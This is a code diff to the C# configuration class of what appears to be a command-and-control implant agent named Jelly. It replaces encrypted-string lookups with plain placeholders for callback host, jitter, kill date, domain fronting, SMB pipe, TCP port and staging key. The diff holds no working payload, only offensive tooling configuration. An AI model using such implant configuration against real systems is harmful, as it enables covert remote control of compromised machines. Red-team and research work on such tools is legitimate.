@@ -94,17 +94,18 @@ namespace Jelly
                         { "killdate", "-1" },
                         { "USER_AGENT", "Jelly-Refactor" },
 #else
-                        { "callback_interval", DecryptString("http_callback_interval_encrypted_here") },
-                        { "callback_jitter", DecryptString("http_callback_jitter_encrypted_here") },
-                        { "callback_port", DecryptString("http_callback_port_encrypted_here") },
-                        { "callback_host", DecryptString("http_callback_host_encrypted_here") },
-                        { "post_uri", DecryptString("http_post_uri_encrypted_here") },
-                        { "encrypted_exchange_check", DecryptString("http_encrypted_exchange_check_encrypted_here") },
-                        { "proxy_host", DecryptString("http_proxy_host_encrypted_here") },
-                        { "proxy_port", DecryptString("http_proxy_port_encrypted_here") },
-                        { "proxy_user", DecryptString("http_proxy_user_encrypted_here") },
-                        { "proxy_pass", DecryptString("http_proxy_pass_encrypted_here") },
-                        { "killdate", DecryptString("http_killdate_encrypted_here") },
+                        { "callback_interval", "http_callback_interval_here" },
+                        { "callback_jitter", "http_callback_jitter_here" },
+                        { "callback_port", "http_callback_port_here" },
+                        { "callback_host", "http_callback_host_here" },
+                        { "post_uri", "http_post_uri_here" },
+                        { "encrypted_exchange_check", "http_encrypted_exchange_check_here" },
+                        { "proxy_host", "http_proxy_host_here" },
+                        { "proxy_port", "http_proxy_port_here" },
+                        { "proxy_user", "http_proxy_user_here" },
+                        { "proxy_pass", "http_proxy_pass_here" },
+                        { "killdate", "http_killdate_here" },
+                        HTTP_ADDITIONAL_HEADERS_HERE
 #endif
                     }
                 }
@@ -130,16 +131,17 @@ namespace Jelly
                         { "killdate", "-1" },
                         { "USER_AGENT", "Jelly-Refactor" },
 #else
-                        { "tasking_type", DecryptString("websocket_tasking_type_encrypted_here")},
-                        { "callback_interval", DecryptString("websocket_callback_interval_encrypted_here") },
-                        { "callback_jitter", DecryptString("websocket_callback_jitter_encrypted_here") },
-                        { "callback_port", DecryptString("websocket_callback_port_encrypted_here") },
-                        { "callback_host", DecryptString("websocket_callback_host_encrypted_here") },
-                        { "ENDPOINT_REPLACE", DecryptString("websocket_ENDPOINT_REPLACE_encrypted_here") },
-                        { "encrypted_exchange_check", DecryptString("websocket_encrypted_exchange_check_encrypted_here") },
-                        { "domain_front", DecryptString("websocket_domain_front_encrypted_here") },
-                        { "USER_AGENT", DecryptString("websocket_USER_AGENT_encrypted_here") },
-                        { "killdate", DecryptString("websocket_killdate_encrypted_here") },
+                        { "tasking_type", "websocket_tasking_type_here"},
+                        { "callback_interval", "websocket_callback_interval_here" },
+                        { "callback_jitter", "websocket_callback_jitter_here" },
+                        { "callback_port", "websocket_callback_port_here" },
+                        { "callback_host", "websocket_callback_host_here" },
+                        { "ENDPOINT_REPLACE", "websocket_ENDPOINT_REPLACE_here" },
+                        { "encrypted_exchange_check", "websocket_encrypted_exchange_check_here" },
+                        { "domain_front", "websocket_domain_front_here" },
+                        { "USER_AGENT", "websocket_USER_AGENT_here" },
+                        { "killdate", "websocket_killdate_here" },
+                        HTTP_ADDITIONAL_HEADERS_HERE
 #endif
                     }
                 }
@@ -157,8 +159,8 @@ namespace Jelly
                         { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                         { "encrypted_exchange_check", "true" },
 #else
-                        { "pipename", DecryptString("smb_pipename_encrypted_here") },
-                        { "encrypted_exchange_check", DecryptString("smb_encrypted_exchange_check_encrypted_here") },
+                        { "pipename", "smb_pipename_here" },
+                        { "encrypted_exchange_check", "smb_encrypted_exchange_check_here" },
 #endif
                     }
                 }
@@ -175,8 +177,8 @@ namespace Jelly
                         { "port", "40000" },
                         { "encrypted_exchange_check", "true" },
 #else
-                        { "port", DecryptString("tcp_port_encrypted_here") },
-                        { "encrypted_exchange_check", DecryptString("tcp_encrypted_exchange_check_encrypted_here") },
+                        { "port", "tcp_port_here" },
+                        { "encrypted_exchange_check", "tcp_encrypted_exchange_check_here" },
 #endif
                     }
                 }
@@ -206,8 +208,9 @@ namespace Jelly
         public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
 #endif
 #else
-        public static string StagingRSAPrivateKey => DecryptString("aes_psk_encrypted_here");
-        public static string PayloadUUID => DecryptString("payload_uuid_encrypted_here");
+        // TODO: Make the AES key a config option specific to each profile
+        public static string StagingRSAPrivateKey = "AESPSK_here";
+        public static string PayloadUUID = "payload_uuid_here";
 #endif
     }
 }
